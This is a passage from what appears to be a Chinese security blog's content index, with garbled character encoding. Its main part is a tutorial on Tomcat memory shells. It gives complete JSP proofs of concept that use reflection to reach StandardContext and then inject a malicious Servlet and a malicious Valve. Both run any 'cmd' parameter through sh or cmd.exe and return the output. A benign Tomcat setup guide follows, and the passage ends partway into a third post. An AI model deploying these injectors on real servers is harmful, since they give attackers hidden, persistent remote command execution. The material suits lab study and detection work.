} catch (Throwable t) { ExceptionUtils.handleThrowable(t); log.error(sm.getString(\u0026#34;standardContext.createWrapper.error\u0026#34;), t); return null; } } else { wrapper = new StandardWrapper(); } synchronized (wrapperLifecyclesLock) { for (String wrapperLifecycle : wrapperLifecycles) { try { Class\u0026lt;?\u0026gt; clazz = Class.forName(wrapperLifecycle); LifecycleListener listener = (LifecycleListener) clazz.getConstructor().newInstance(); wrapper.addLifecycleListener(listener); } catch (Throwable t) { ExceptionUtils.handleThrowable(t); log.error(sm.getString(\u0026#34;standardContext.createWrapper.listenerError\u0026#34;), t); return null; } } } synchronized (wrapperListenersLock) { for (String wrapperListener : wrapperListeners) { try { Class\u0026lt;?\u0026gt; clazz = Class.forName(wrapperListener); ContainerListener listener = (ContainerListener) clazz.getConstructor().newInstance(); wrapper.addContainerListener(listener); } catch (Throwable t) { ExceptionUtils.handleThrowable(t); log.error(sm.getString(\u0026#34;standardContext.createWrapper.containerListenerError\u0026#34;), t); return null; } } } return wrapper; } è°ƒè¯•ä¸€ä¸‹ï¼Œä¼šå‘ç°è¿™é‡Œçš„wrapperä¼šè¢«èµ‹å€¼ä¸º StandardWrapper ç±»å®ä¾‹ï¼š è¿”å›ç»“æœä¸º\nè¿™ä¸ªæ–¹æ³•çš„é‡ç‚¹ä¹Ÿå°±æ˜¯è¿™ä¸ªï¼Œå¯ä»¥å°†ä¸€ä¸ªå˜é‡èµ‹å€¼ä¸ºStandardWrapperç±»å®ä¾‹ï¼ˆå…¶å®ä¹Ÿå°±æ˜¯å¯¹åº”ä¸€ä¸ªServletï¼‰ã€‚\nç„¶åç»™è¿™ä¸ªwrapperè®¾ç½®å†…éƒ¨å€¼ï¼š åˆ†åˆ«è¯´æ˜ä¸€ä¸‹ï¼š\nè°ƒç”¨äº†setLoadOnStartup()æ–¹æ³•è®¾ç½®loadOnStartupå˜é‡ï¼Œ è°ƒç”¨setName()å°†ContainerBaseç±»ä¸­çš„å˜é‡nameèµ‹å€¼ä¸ºä¸€ä¸ªå€¼ï¼š è°ƒç”¨setServletClass()æ–¹æ³•è®¾ç½®servletClasså˜é‡çš„å€¼ï¼š å†ç»§ç»­å¾€åé¢çœ‹ï¼š å½“ç¨‹åºæŠŠè¿™ä¸ªWrapperï¼ˆç†è§£ä¸ºä¸€ä¸ªServletï¼‰è®¾ç½®å¥½äº†åï¼Œå°†å…¶åŠ å…¥åˆ°contextçš„â€œå­å®¹å™¨â€ä¸­ã€‚é‡ç‚¹å…³æ³¨addChild()æ–¹æ³•å’ŒaddServletMappingDecoded()æ–¹æ³•ï¼Œä¸‹é¢æ¥åˆ†åˆ«è¿›å…¥çœ‹ä¸€ä¸‹ï¼š\naddChild()ï¼š\nå‰é¢çš„ä»£ç å°±æ˜¯åˆ¤æ–­æ˜¯ä¸æ˜¯è‡ªå¸¦çš„jspServletï¼Œè¿™é‡Œæ˜¯è‡ªå¸¦çš„DefaultSerrvletï¼Œè‡ªç„¶ä¸æ˜¯ï¼Œé‡ç‚¹æ˜¯ä¸‹é¢è°ƒç”¨çˆ¶ç±»ContainerBaseçš„addChild()æ–¹æ³•ï¼Œè¿›å…¥ï¼š\nä¼šè°ƒç”¨addChildInternal()æ–¹æ³•ï¼š é‡ç‚¹è¿˜æ˜¯å¦‚ä¸‹ä»£ç ï¼š å…ˆè¯´æ˜ä¸€ä¸‹è¿™é‡Œçš„ifæ¡ä»¶ï¼Œè¿™é‡Œéœ€è¦ç¨‹åºå¯¹ä¼ è¿›å»çš„childä½¿ç”¨getName()æ—¶çš„æœ‰å›æ˜¾ï¼Œå¦åˆ™ç›´æ¥ä¸¢å‡ºå¼‚å¸¸ï¼š\næ‰€ä»¥åœ¨å‰é¢è¯´æ˜çš„setName()å‡½æ•°è®¾ç½®åç§°è¿˜æ˜¯éå¸¸æœ‰å¿…è¦çš„ã€‚\nå†å°±æ˜¯ifè¯­å¥è¿‡åï¼Œå…ˆæ˜¯ç»™childè®¾ç½®äº†çˆ¶ç±»ï¼Œåœ¨ä¸‹é¢ä¹Ÿå¯ä»¥çœ‹åˆ°ç›¸å…³å€¼çš„æƒ…å†µã€‚\nç„¶åå‰é¢ä¹Ÿè¯´è¿‡äº†ï¼Œè¿™é‡Œçš„childrenæ˜¯ä¸€ä¸ªHashMapç±»å®ä¾‹ï¼Œæ‰€ä»¥è¿™é‡Œå°±æ˜¯è°ƒç”¨äº†putæ–¹æ³•æ”¾è¿›é”®å€¼ï¼Œå’Œå‰é¢åˆ†æservletåŠ è½½æµç¨‹çš„findChildren()æ–¹æ³•å½¢æˆé—­ç¯ã€‚\naddServletMappingDecoded()ï¼š è·Ÿè¿›ä¸€ä¸‹getServletMappings()æ–¹æ³•ï¼Œè¿”å›äº†å…³é”®å­—servletMappingsï¼š\næœä¸€ä¸‹è¿™ä¸ªå…³é”®å­—ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„ä¿¡æ¯ï¼š è¿™é‡Œä¹Ÿæœ‰getValue()ç­‰å‡½æ•°ï¼Œ\næ‰€ä»¥å¯ä»¥å¾ˆæ¸…æ¥šåœ°çŸ¥é“å‰é¢çš„forå¾ªç¯å°±æ˜¯éå†web.xmlä¸­çš„servlet-mappingçš„servlet-nameå’Œå¯¹åº”çš„url-patternï¼Œç„¶åè°ƒç”¨addServletMappingDecode()æ–¹æ³•å½¢æˆæ˜ å°„ã€‚\nâ€”â€”â€”â€”â€”â€”\nå¤§æ¦‚åˆ†æå®Œæ¯•ï¼Œç°åœ¨å°±æ˜¯æ¥å°è¯•æ„é€ ä¸€ä¸‹POCã€‚\næ€»ç»“ä¸€ä¸‹åœ¨è¿™ä¸€æ¿å—é‡åˆ°çš„çŸ¥è¯†ç‚¹ï¼š\nå¯ä»¥å€Ÿé‰´è¿™é‡Œæºç çš„æ–¹æ³•ï¼Œä½¿ç”¨createWrapper()æ–¹æ³•æ¥åˆ›å»ºä¸€ä¸ªWrapperå®ä¾‹ ç„¶åå†å¯¹å…¶ä½¿ç”¨å„ç§æ–¹æ³•æ¥â€œå……å®â€é‡Œé¢çš„å˜é‡ä»¥è¾¾åˆ°åœ¨åŠ è½½æ—¶å¯ä»¥è°ƒç”¨å‡ºæ¶æ„Servlet æ³¨å…¥è¿‡ç¨‹ æ¶æ„Servletæºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 Servlet badServlet = new Servlet(){ public void init(ServletConfig var1) throws ServletException{ } public ServletConfig getServletConfig(){ return null; } public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException{ System.out.println(\u0026#34;servletå¯åŠ¨\u0026#34;); String cmd = servletRequest.getParameter(\u0026#34;cmd\u0026#34;); boolean isLinux = true; String osTyp = System.getProperty(\u0026#34;os.name\u0026#34;); if (osTyp != null \u0026amp;\u0026amp; osTyp.toLowerCase().contains(\u0026#34;win\u0026#34;)) { isLinux = false; } String[] cmds = isLinux ? new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, cmd} : new String[]{\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, cmd}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in).useDelimiter(\u0026#34;\\\\a\u0026#34;); String output = s.hasNext() ? s.next() : \u0026#34;\u0026#34;; PrintWriter out = servletResponse.getWriter(); out.println(output); out.flush(); out.close(); } public String getServletInfo(){ return null; } public void destroy(){ } }; è·å–StandardContextå¯¹è±¡ï¼š\n1 2 3 4 5 6 7 ServletContext servletContext = request.getSession().getServletContext(); Field field0 = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(servletContext); Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); åˆ›å»ºWrapperï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 //é¢„è®¾ç½®Servletåç§° String name = \u0026#34;123\u0026#34;; //åç§°éšä¾¿ //è·å–StandardWrapper Wrapper wrapper = (Wrapper)standardContext.createWrapper(); //ç›¸å…³é…ç½® wrapper.setName(name); wrapper.setLoadOnStartup(1); //wrapper.setServletClass(name); //æœ‰æ— æ— æ‰€è°“ wrapper.setServlet(badServlet); //é‡ç‚¹è®¾ç½®ä¸ºWrapperç‚¹åœ¨è¿™é‡Œ //å°†å…¶åŠ å…¥åˆ°å½“å‰ç¯å¢ƒçš„StandardContextä¸­ standardContext.addChild(wrapper); standardContext.addServletMappingDecoded(\u0026#34;/servlet\u0026#34;,name); æœ€ç»ˆPOC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.IOException\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.PrintWriter\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.InputStream\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Scanner\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;javax.servlet.*\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.Wrapper\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.PrintWriter\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.PrintWriter\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;% Servlet badServlet = new Servlet(){ public void init(ServletConfig var1) throws ServletException{ } public ServletConfig getServletConfig(){ return null; } public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException{ System.out.println(\u0026#34;servletå¯åŠ¨\u0026#34;); String cmd = servletRequest.getParameter(\u0026#34;cmd\u0026#34;); boolean isLinux = true; String osTyp = System.getProperty(\u0026#34;os.name\u0026#34;); if (osTyp != null \u0026amp;\u0026amp; osTyp.toLowerCase().contains(\u0026#34;win\u0026#34;)) { isLinux = false; } String[] cmds = isLinux ? new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, cmd} : new String[]{\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, cmd}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in).useDelimiter(\u0026#34;\\\\a\u0026#34;); String output = s.hasNext() ? s.next() : \u0026#34;\u0026#34;; PrintWriter out = servletResponse.getWriter(); out.println(output); out.flush(); out.close(); } public String getServletInfo(){ return null; } public void destroy(){ } }; ServletContext servletContext = request.getSession().getServletContext(); Field field0 = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(servletContext); Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); //é¢„è®¾ç½®Servletåç§° String name = badServlet.getClass().getName(); //åç§°éšä¾¿ //è·å–StandardWrapper Wrapper wrapper = (Wrapper)standardContext.createWrapper(); //ç›¸å…³é…ç½® wrapper.setName(name); wrapper.setLoadOnStartup(1); //wrapper.setServletClass(name); //æœ‰æ— æ— æ‰€è°“ wrapper.setServlet(badServlet); //é‡ç‚¹è®¾ç½®ä¸ºWrapperç‚¹åœ¨è¿™é‡Œ //å°†å…¶åŠ å…¥åˆ°å½“å‰ç¯å¢ƒçš„StandardContextä¸­ standardContext.addChild(wrapper); standardContext.addServletMappingDecoded(\u0026#34;/servlet\u0026#34;,name); %\u0026gt; å¼€å¯æœåŠ¡å™¨åè¿˜æ˜¯åŒæ ·çš„æ“ä½œæ‰§è¡Œä¸€éå³å¯ï¼ŒæˆåŠŸå‘½ä»¤æ‰§è¡Œï¼š\nValve å‹å†…å­˜é©¬ åœ¨Tomcatä¸­å®šä¹‰äº†ä¸¤ä¸ªæ¥å£ï¼Œåˆ†åˆ«æ˜¯Pipelineå’ŒValveã€‚Valveå¯ä»¥ç†è§£ä¸ºPipelineçš„åŸºæœ¬å•ä½ï¼Œç”¨äºå¤„ç†ä¼ å…¥è¯·æ±‚å’Œä¼ å‡ºè¯·æ±‚ã€‚\nTomcatçš„ç®¡é“æœºåˆ¶æ˜¯æŒ‡åœ¨å¤„ç†HTTPè¯·æ±‚æ—¶ï¼Œå°†ä¸€ç³»åˆ—çš„ValveæŒ‰é¡ºåºé“¾æ¥åœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªå¤„ç†ç®¡é“ã€‚æ¯ä¸ªValveè´Ÿè´£åœ¨è¯·æ±‚å¤„ç†è¿‡ç¨‹ä¸­æ‰§è¡Œç‰¹å®šçš„ä»»åŠ¡ï¼Œä¾‹å¦‚è®¤è¯ã€æ—¥å¿—è®°å½•ã€å®‰å…¨æ€§æ£€æŸ¥ç­‰ã€‚è¿™æ ·ï¼Œè¯·æ±‚å°±ä¼šåœ¨ç®¡é“ä¸­ä¾æ¬¡ç»è¿‡æ¯ä¸ªValveï¼Œæ¯ä¸ªValveéƒ½å¯ä»¥å¯¹è¯·æ±‚è¿›è¡Œå¤„ç†æˆ–è€…ä¼ é€’ç»™ä¸‹ä¸€ä¸ªValve\nTomcatæ¯ä¸ªå±‚çº§çš„å®¹å™¨ï¼ˆEngineã€Hostã€Contextã€Wrapperï¼‰éƒ½æœ‰ç›¸å¯¹åº”çš„å®ç°Valveå¯¹è±¡ï¼ˆStandardEngineValveã€StandardHostValveã€StandardContextValveã€StandardWrapperValveï¼‰ï¼Œè¿™äº›ValveåŒæ—¶ç»´æŠ¤ä¸€ä¸ªPipelineå®ä¾‹ï¼ˆStandardPipelineï¼‰ã€‚åœ¨æ¯ä¸ªå±‚çº§å®¹å™¨ä¸­çš„ç®¡é“ä¸­éƒ½æœ‰è‡³å°‘æœ‰ä¸€ä¸ªValveï¼Œç§°ä¹‹ä¸ºåŸºç¡€é˜€ï¼Œå…¶ä½œç”¨æ˜¯è¿æ¥å½“å‰å®¹å™¨çš„ä¸‹ä¸€ä¸ªå®¹å™¨ã€‚\nçœ‹Valveæ¥å£çš„å®šä¹‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.apache.catalina; import java.io.IOException; import javax.servlet.ServletException; import org.apache.catalina.connector.Request; import org.apache.catalina.connector.Response; public interface Valve { //è·å–ä¸‹ä¸€ä¸ªValveï¼Œnullä»£è¡¨æœ€åä¸€ä¸ª Valve getNext(); //è®¾ç½®ä¸‹ä¸€ä¸ªValve void setNext(Valve valve); void backgroundProcess(); //æ‰§è¡Œå¯¹åº”è¯·æ±‚å¤„ç†é€»è¾‘ void invoke(Request request, Response response) throws IOException, ServletException; boolean isAsyncSupported(); } åœ¨Tomcatä¸­çš„Valveå®ç°ç±»æ˜¯ValveBaseæŠ½è±¡ç±»ï¼Œå…¶å®ç°äº†å¤§éƒ¨åˆ†Valveæ¥å£çš„åŸºæœ¬æ–¹æ³•ï¼Œåªéœ€è¦é‡å†™invoke()æ–¹æ³•ã€‚\nè€Œçœ‹Pipelineæ¥å£çš„å®ç°ç±»StandardPipelineï¼Œå…¶å®šä¹‰æœ‰addValve()æ–¹æ³•ï¼š è€Œåœ¨å‰é¢è¯´è¿‡ï¼ŒContainerçš„å››ä¸ªå®¹å™¨éƒ½æ˜¯æœ‰å…¶ç›¸å¯¹åº”çš„Valveçš„ï¼Œçœ‹äº†ä¸€ä¸‹ï¼Œå››ä¸ªå®¹å™¨çš„å®ç°ç±»StandardEngineã€StandardHostç­‰éƒ½æ˜¯ç»§æ‰¿äºContainerBaseç±»çš„ï¼Œå¹¶ä¸”è¿™ä¸ªContainerBaseç±»ä¸­æœ‰addValve()æ–¹æ³•ï¼š å…¶å®ä¹Ÿå°±æ˜¯è°ƒç”¨çš„StandardPipelineç±»çš„addValve()æ–¹æ³•ï¼š\nâ€”â€”â€”â€”\nç°åœ¨å°±å¯ä»¥å°è¯•æ¥ç›´æ¥æ„é€ äº†ï¼Œè¿‡ç¨‹ï¼š\nåå°„ä»HttpRequestServlet è·å– Request åå°„ä» Request è·å–StandardContext è·å–åˆ°äº†StandardContextå°±å¯ä»¥å°è¯•ç›´æ¥å‘é‡Œé¢æ·»åŠ æ¶æ„Valveäº†ã€‚ è·å–StandardContextç­‰å››ä¸ªå®¹å™¨å¯¹è±¡éƒ½å¯ä»¥ï¼š\n1 2 3 4 5 6 Field requestField = request.getClass().getDeclaredField(\u0026#34;request\u0026#34;); requestField.setAccessible(true); Request request1 = (Request) requestField.get(request); StandardContext standardContext = (StandardContext) request1.getContext(); // StandardHost standardHost = (StandardHost) request1.getHost(); // StandardWrapper standardWrapper = (StandardWrapper) request1.getWrapper(); ä½†æˆ‘æ˜¯tomcat9ï¼Œåº”è¯¥æ˜¯ç”¨ä¸äº†è¿™ä¸ªï¼Œè¿˜æ˜¯å›åˆ°ä¹‹å‰é‚£ä¸ªè·å–StandardContext()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 ServletContext servletContext = request.getSession().getServletContext(); Field field0 = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(servletContext); Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); å®šä¹‰æ¶æ„Valveï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ValveBase badValve = new ValveBase() { public void invoke(Request req, Response resp){ try { if (req.getParameter(\u0026#34;cmd\u0026#34;) != null) { boolean isLinux = true; String osTyp = System.getProperty(\u0026#34;os.name\u0026#34;); if (osTyp != null \u0026amp;\u0026amp; osTyp.toLowerCase().contains(\u0026#34;win\u0026#34;)) { isLinux = false; } InputStream in = isLinux ? (Runtime.getRuntime().exec(new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;,req.getParameter(\u0026#34;cmd\u0026#34;)}).getInputStream()) : (Runtime.getRuntime().exec(new String[]{\u0026#34;cmd.exe\u0026#34;,\u0026#34;/c\u0026#34;,req.getParameter(\u0026#34;cmd\u0026#34;)}).getInputStream()); Scanner s = new Scanner(in).useDelimiter(\u0026#34;\\\\A\u0026#34;); String o = s.hasNext() ? s.next() : \u0026#34;\u0026#34;; resp.getWriter().write(o); } this.getNext().invoke(req, resp); } catch (Exception e) { e.printStackTrace(); } } }; ç„¶åç›´æ¥åŠ å…¥å³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 ServletContext servletContext = request.getSession().getServletContext(); Field field0 = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(servletContext); Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); ValveBase badValve = new ValveBase() { public void invoke(Request req, Response resp){ try { if (req.getParameter(\u0026#34;cmd\u0026#34;) != null) { boolean isLinux = true; String osTyp = System.getProperty(\u0026#34;os.name\u0026#34;); if (osTyp != null \u0026amp;\u0026amp; osTyp.toLowerCase().contains(\u0026#34;win\u0026#34;)) { isLinux = false; } InputStream in = isLinux ? (Runtime.getRuntime().exec(new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;,req.getParameter(\u0026#34;cmd\u0026#34;)}).getInputStream()) : (Runtime.getRuntime().exec(new String[]{\u0026#34;cmd.exe\u0026#34;,\u0026#34;/c\u0026#34;,req.getParameter(\u0026#34;cmd\u0026#34;)}).getInputStream()); Scanner s = new Scanner(in).useDelimiter(\u0026#34;\\\\A\u0026#34;); String o = s.hasNext() ? s.next() : \u0026#34;\u0026#34;; resp.getWriter().write(o); } this.getNext().invoke(req, resp); } catch (Exception e) { e.printStackTrace(); } } }; standardContext.addValve(badValve); æœ€ç»ˆPOC index.jspï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.InputStream\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Scanner\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;javax.servlet.*\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.connector.Request\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.valves.ValveBase\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.connector.Response\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;% ServletContext servletContext = request.getSession().getServletContext(); Field field0 = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(servletContext); Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); ValveBase badValve = new ValveBase() { public void invoke(Request req, Response resp){ try { if (req.getParameter(\u0026#34;cmd\u0026#34;) != null) { boolean isLinux = true; String osTyp = System.getProperty(\u0026#34;os.name\u0026#34;); if (osTyp != null \u0026amp;\u0026amp; osTyp.toLowerCase().contains(\u0026#34;win\u0026#34;)) { isLinux = false; } InputStream in = isLinux ? (Runtime.getRuntime().exec(new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;,req.getParameter(\u0026#34;cmd\u0026#34;)}).getInputStream()) : (Runtime.getRuntime().exec(new String[]{\u0026#34;cmd.exe\u0026#34;,\u0026#34;/c\u0026#34;,req.getParameter(\u0026#34;cmd\u0026#34;)}).getInputStream()); Scanner s = new Scanner(in).useDelimiter(\u0026#34;\\\\A\u0026#34;); String o = s.hasNext() ? s.next() : \u0026#34;\u0026#34;; resp.getWriter().write(o); } this.getNext().invoke(req, resp); } catch (Exception e) { e.printStackTrace(); } } }; standardContext.addValve(badValve); //æç¤ºæ³¨å…¥ out.println(\u0026#34;success inject\u0026#34;); %\u0026gt; ç„¶åå¼€å¯æœåŠ¡å™¨å³å¯ï¼š\næˆåŠŸæ‰§è¡Œï¼š\nå‚è€ƒæ–‡ç« ï¼š\nhttps://www.freebuf.com/articles/web/343094.html\n","date":"2024-09-03T20:23:06+08:00","permalink":"https://fupanc-w1n.github.io/p/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/","title":"Tomcatå†…å­˜é©¬"},{"content":"Tomcatæ­å»ºæ•™ç¨‹ å…ˆåœ¨å®˜ç½‘ä¸‹è½½tomcatï¼Œæˆ‘è¿™é‡Œä¸‹è½½çš„tomcat9ï¼š ç„¶åå°±å¯ä»¥å¼€å§‹åˆ›å»ºé¡¹ç›®äº†ã€‚\nåˆ›å»ºé¡¹ç›® åˆ›å»ºä¸€ä¸ªæ–°çš„mavené¡¹ç›®å³å¯ï¼Œjdkç‰ˆæœ¬ä½¿ç”¨çš„8ï¼š åˆ›å»ºè¿‡åå°±æ‰“å¼€é¡¹ç›®ç»“æ„ï¼Œæ‰“å¼€Facetsæ¨¡å—ï¼Œç‚¹å‡»è¿™ä¸ª+å·ç„¶åé€‰æ‹©webï¼š\nç„¶åä¼šè‡ªåŠ¨å¼¹å‡ºé€‰æ¨¡å—ï¼Œé€‰æ‹©è‡ªå·±åˆ›å»ºçš„é¡¹ç›®å³å¯ï¼š ç¡®å®šåå°±æ˜¯å¦‚ä¸‹ï¼š\nç„¶åç‚¹å‡»ä¸‹é¢é‚£ä¸ªåˆ›å»ºå·¥ä»¶ã€‚ç„¶åå°±è·³è½¬åˆ°ä¸‹é¢è¿™ä¸ªç•Œé¢ï¼Œå†ç‚¹å‡»åº”ç”¨+ç¡®å®šå³å¯ï¼š\né…ç½®TomcatæœåŠ¡å™¨ ç‚¹å¼€å½“å‰æ–‡ä»¶åç‚¹å‡»é…ç½®ï¼Œå†ç‚¹å‡»å¼¹å‡ºæ¥çš„+å·ï¼ˆæˆ‘è¿™é‡Œæ˜¯å·²ç»é…ç½®å¥½äº†ï¼Œå¦‚å›¾ç‚¹å‡»ç¼–è¾‘é…ç½®å³å¯ï¼‰ï¼š\nç„¶åé€‰æ‹©æœ¬åœ°çš„tomcatï¼š\nç„¶åé€‰å¥½ä¹‹å‰ä¸‹è½½çš„tomcatè·¯å¾„å³å¯ï¼š\nè¿™é‡Œçš„HTTPç«¯å£å¯ä»¥æ”¹ä¸€ä¸‹ï¼Œé˜²æ­¢ä¸å¸¸ç”¨çš„burpçš„8080ç«¯å£å†²çªã€‚ç„¶åé…ç½®è¾“å‡ºè·¯å¾„ï¼š\nå¦‚å›¾å…ˆç‚¹å‡»éƒ¨ç½²ç„¶åç‚¹å‡»+å†ç‚¹å‡»å·¥ä»¶å³å¯ï¼Œè¿™é‡Œçš„å·¥ä»¶å°±æ˜¯æœ¬åœ°çš„æ–‡ä»¶éƒ¨ç½²ï¼ˆä¹Ÿå°±æ˜¯åç»­æ­å»ºå¥½ç¯å¢ƒåå¯ä»¥ç›´æ¥åœ¨ideaå†™çš„åº”ç”¨ç¨‹åºçš„æºç ï¼‰ï¼ŒåŒæ ·çš„å¯ä»¥ç›´æ¥æ·»åŠ ä¸€ä¸ªå¤–éƒ¨æºï¼ˆé€šå¸¸æ˜¯ä¸€ä¸ªwaråŒ…ï¼‰æ¥ä½œä¸ºä¸€ä¸ªæ–°çš„åº”ç”¨ç¨‹åºï¼Œåç»­æˆåŠŸæ­å»ºçš„æ•ˆæœå¦‚ä¸‹ï¼š\nç„¶åå›åˆ°serverï¼Œé€‰æ‹©çƒ­éƒ¨ç½²ï¼Œè¿™æ ·æ”¹äº†æ–‡ä»¶è¿‡ååˆ·æ–°ä¸€ä¸‹å³å¯ï¼Œæ ¹æ®è‡ªå·±éœ€æ±‚é€‰æ‹©æµè§ˆå™¨ï¼š\nç„¶åapplyå’Œç¡®å®šå³å¯ã€‚\nç°åœ¨å°±å¯ä»¥å°è¯•å¼€å§‹è¿è¡Œäº†ï¼Œå…ˆåœ¨webç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªindex.jspæ–‡ä»¶ï¼š\nå†…å®¹ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;%-- Created by IntelliJ IDEA. User: ASUS Date: 2024/8/30 Time: 13:00 To change this template use File | Settings | File Templates. --%\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Hello World\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ç„¶åç‚¹å‡»è¿è¡Œå³å¯ï¼š å¦‚æœæ­¤æ—¶ideaæ§åˆ¶å°ä¸Šè¾“å‡ºæœ‰ä¹±ç ï¼Œè¿™æ˜¯å› ä¸ºä¸¤è¾¹çš„ç¼–ç æ ¼å¼ä¸åŒï¼Œtomcaté…ç½®æ–‡ä»¶ä¸­æ˜¯UTF-8ï¼š\nå¯ä»¥å°†è¿™ä¸ªæ”¹æˆideaé»˜è®¤çš„GBK\næˆ–è€…æ”¹ideaè¿™é‡Œä¸ºUTF-8ï¼Œå³æ”¹æˆç›¸åŒçš„ã€‚\néšåå°±æ²¡æœ‰ä¹±ç é—®é¢˜äº†ï¼ŒæˆåŠŸé…ç½®tomcatç¯å¢ƒã€‚\nå‚è€ƒæ–‡ç« ï¼š\nhttps://www.cnblogs.com/bktown/p/17636156.html#%E4%B8%8B%E8%BD%BDtomcat\n","date":"2024-08-30T20:23:06+08:00","permalink":"https://fupanc-w1n.github.io/p/tomcat%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/","title":"Tomcatæ­å»ºæ•™ç¨‹"},{"content":"Romeé“¾ RMOE æ˜¯ä¸€ä¸ªç”¨äºRSS å’Œ Atom 